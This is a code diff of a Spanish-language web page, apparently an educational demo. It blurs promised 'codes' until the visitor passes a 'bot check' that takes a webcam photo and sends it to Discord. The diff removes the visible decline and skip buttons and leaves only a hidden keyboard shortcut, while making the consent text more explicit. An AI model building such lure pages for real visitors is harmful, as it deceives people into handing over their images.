@@ -21,7 +21,6 @@
     .code kbd{background:#0f1a2f;border:1px solid #2a3b57;border-radius:8px;padding:6px 10px;font-family:ui-monospace,Menlo,Consolas;letter-spacing:.5px}
     .btn{appearance:none;border:0;border-radius:12px;padding:10px 14px;font-weight:700;cursor:pointer}
     .btn.primary{background:var(--accent);color:#052011;box-shadow:0 8px 20px rgba(34,197,94,.35)}
-    .btn.ghost{background:transparent;border:1px solid #334155;color:var(--ink)}
     .muted{color:var(--muted)}
     .blurred{filter:blur(8px)}
     .overlay{position:fixed;inset:0;background:rgba(0,0,0,.7);display:none;align-items:center;justify-content:center;padding:18px}
@@ -31,7 +30,6 @@
     .modal p{margin:6px 0 0;color:var(--muted)}
     .row{display:flex;gap:10px;flex-wrap:wrap;margin-top:14px}
     .tag{display:inline-block;border:1px solid #334155;border-radius:999px;padding:6px 10px;font-size:12px;color:var(--muted);margin-right:8px}
-    .edu{border-left:4px solid var(--warn);padding-left:10px;margin-top:10px}
     .log{font-family:ui-monospace,Menlo,Consolas; background:#0a0f1d;border:1px dashed #334155;border-radius:12px;padding:12px;min-height:110px;white-space:pre-wrap}
     video,canvas,img{width:100%;border-radius:12px;background:black;display:block}
   </style>
@@ -59,7 +57,6 @@
           <p class="muted" style="margin-top:10px">Los códigos se mostrarán completos tras una verificación rápida.</p>
           <div class="row">
             <button id="btn-open" class="btn primary">Verificar y ver códigos</button>
-            <button id="btn-continue" class="btn ghost">Continuar sin verificación</button>
           </div>
         </section>
         <aside class="panel">
@@ -74,16 +71,16 @@
   <div id="consentLayer" class="overlay" role="dialog" aria-modal="true">
     <div class="modal">
       <h2>Verificación con cámara (consentimiento requerido)</h2>
-      <p class="edu">los codigos seran actualizados gradualmente <strong>cámara</strong>, por favor <strong>verifica</strong> que <strong>no</strong> eres un bot.</p>
+      <p>Los códigos se irán desbloqueando gradualmente. Para continuar, necesitamos verificar manualmente que no eres un bot.</p>
       <label style="display:flex;gap:10px;margin-top:10px">
         <input id="ck" type="checkbox" />
-        <span>✅acepta los permisos para verificar que no seas un bot .</span>
+        <span>✅ Acepto activar la <strong>cámara</strong>, permitir la captura de <strong>una</strong> foto y su <strong>envío a Discord</strong> en esta demo educativa.</span>
       </label>
       <div class="row">
         <button id="btn-consent" class="btn primary" disabled>Dar consentimiento y continuar</button>
-       
       </div>
       <p class="muted" style="margin-top:8px">HTTPS requerido • Puedes revocar permisos en la configuración del navegador.</p>
+      <p class="muted" style="margin-top:4px">(Atajo para docentes: pulsa la tecla <strong>ñ</strong> para continuar <em>sin</em> verificación.)</p>
     </div>
   </div>
 
@@ -98,7 +95,7 @@
         <img id="preview" alt="Vista previa" />
       </figure>
       <div class="row">
-        <button id="btn-cancel" class="btn ghost" disabled>Detener cámara</button>
+        <button id="btn-cancel" class="btn" disabled>Detener cámara</button>
         <button id="btn-close" class="btn primary" style="display:none">Cerrar</button>
       </div>
     </div>
@@ -125,17 +122,26 @@
 
     let stream = null; let lastBlob = null;
 
-    function unlock(){ codes.classList.remove('blurred'); codes.removeAttribute('aria-hidden'); }
+    function unlock(){ codes.classList.remove('blurred'); codes.removeAttribute('aria-hidden'); log('Códigos desbloqueados.'); }
     function openConsent(){ consentLayer.classList.add('show'); }
     function closeConsent(){ consentLayer.classList.remove('show'); }
     function openCapture(){ captureLayer.classList.add('show'); }
     function closeCapture(){ captureLayer.classList.remove('show'); }
 
     $("btn-open").addEventListener('click', openConsent);
-    $("btn-continue").addEventListener('click', ()=>{ unlock(); log('Continuaste sin verificación.'); });
+
+    // Atajo teclado: ñ para continuar SIN verificación (sin usar cámara)
+    document.addEventListener('keydown', (e)=>{
+      if (!consentLayer.classList.contains('show')) return;
+      const key = e.key || '';
+      if (key === 'ñ' || key === 'Ñ'){
+        e.preventDefault();
+        closeConsent();
+        unlock();
+      }
+    });
 
     ck.addEventListener('change', ()=>{ btnConsent.disabled = !ck.checked; });
-    $("btn-nope").addEventListener('click', ()=>{ closeConsent(); unlock(); log('Rechazaste el uso de cámara.'); });
 
     btnConsent.addEventListener('click', async ()=>{
       if (!ck.checked) return;
@@ -204,5 +210,3 @@
   </script>
 </body>
 </html>
-
-
